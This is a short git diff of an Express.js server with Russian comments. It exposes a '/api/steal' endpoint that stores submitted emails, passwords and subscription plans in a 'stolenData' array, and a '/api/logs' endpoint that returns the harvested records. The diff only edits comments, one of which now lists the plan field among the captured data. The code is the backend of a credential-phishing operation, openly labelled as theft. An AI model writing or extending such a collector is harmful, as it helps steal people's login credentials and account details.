@@ -8,7 +8,7 @@ app.use(express.json());
 
 let stolenData = [];
 
-// Прием данных (почта и пароль)
+// Прием данных (почта, пароль, тариф)
 app.post('/api/steal', (req, res) => {
     const { email, password, plan } = req.body;
     if (email) {
@@ -23,7 +23,7 @@ app.post('/api/steal', (req, res) => {
     res.status(200).send({ status: 'ok' });
 });
 
-// Отдача логов для панели
+// Отдача логов
 app.get('/api/logs', (req, res) => {
     res.json(stolenData);
 });
